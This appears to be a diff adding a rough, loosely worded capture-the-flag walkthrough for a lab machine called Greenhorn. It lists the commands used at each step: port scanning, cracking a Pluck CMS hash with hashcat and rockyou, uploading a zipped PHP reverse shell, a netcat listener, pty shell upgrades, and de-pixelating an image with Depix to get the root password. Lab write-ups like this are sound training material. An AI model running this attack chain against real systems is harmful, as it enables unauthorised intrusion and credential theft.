@@ -1,0 +1,49 @@
+greenhorn
+1.download vpn and typing sudo openvpn <file_name.ovpn> 
+2. apply sudo masscan -p0-65535,U0-65535 <ip_machine> -inte=1000 -e tun0
+3.nmap -sV -Pn -T5 -vvvv <ip_name>
+4. later nmap -sS -sV -sC -vvv -oN scan_greenhorn 10.10.11.25
+5. I don't acces only ip address then add ip in host and named
+with alias, in this case could be greenhorn.htb 
+the path to add alias is /etc/host
+6. once visit page, I found login user, I view that page is
+a cmr based in app pluk and searh exploit pluk version and
+login.
+7. explore other port number 3000 and I found page similar 
+a github with a script login.
+8.I search CTRL+F and typing password and so I found
+path 
+9. path was data/settings/pass.php
+10. later I went path in page port 3000 and I found hash
+this hash is sha512.
+11. I used hashcat or crackstation
+12. first use hashcat
+13. the command is followed: hashcat 
+note: install name-that-hash identify hash and hashcat with 
+apt-cache searh (name-that-hash) and apt-get install name-that
+-hash and apt-get install hashcat.
+-once installed programs apply:
+name-that-hash -t "hash"
+I view sha-512(I knew) but code 1700
+this code used in hashcat.
+14. copy and paste hash in plain-text and typing:
+hashcat -m 1700 hash_greenhorn /usr/share/secList/Passwords/Leaked-Databases/rockyou.txt --show
+before apply locate rockyou.txt where is path wordlist test.
+15. apply reversehsell in code php and upload to manage package
+this reverse shell has comprimed in format .zip
+16. open shell and typing nc -nlvp 4444 (in this case)
+17.once into the server apply command:
+python3 -c 'import pty;pty.spawn("/bin/bash")"
+18. CTRL+Z typing stty raw -echo (autocomplete) 
+19. export TERM=xterm
+20. let's go to junior user and view user.txt
+21. I was stoped and apply su junior and password iloveyou1
+22. I found first flag and document type .pdf and go download
+23. open server with python3 -m http.server 8181
+24. apply wget http://10.10.11.23:8181/openvas.pdf
+25. git clone https://github.com/spipm/Depix depix for image
+26. apply pdfimage openvas.pdf 
+27. the output apply depix
+28. commands: chmod +x *py
+28.1 python3 depix.py -p ../greenhorn-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o out.png
+29. apply password root and move directory root to flag 
